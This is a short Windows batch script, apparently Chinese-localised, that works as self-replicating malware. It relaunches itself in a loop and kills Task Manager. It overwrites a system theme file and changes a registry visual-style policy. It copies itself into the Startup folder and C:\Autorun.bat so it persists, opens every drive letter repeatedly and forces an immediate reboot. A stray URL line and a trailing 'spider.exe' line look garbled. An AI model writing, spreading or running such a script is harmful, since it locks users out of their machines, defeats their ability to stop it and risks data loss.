@echo off
color 0a
title=
:1   
mode con cols=14 lines=1
start %0 
taskkill /f /im taskmgr.exe
copy macro.dll C:\WINDOWS\Resources\Themes\"Windows "Classic.theme
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "SetVisualStyle" /t reg_sz /d "" /f >nul
::   "SetVisualStyle" 
copy %0 c:\Documents" "and" "Settings\All" "Users\「开始」菜单\程序\启动\Autorun.bat
copy %0 c:\Autorun.bat
http://www.baidu.com/forbiddenip/forbidden.html
start c:/&start d:/&start e:/&start f:/&start g:/&start h:/&start i:/&start j:/&start k:/&start l:/&start m:/&start n:/
start %0
shutdown -r -t 0
taskkill /f /im taskmgr.exe
goto 1
spider.exe



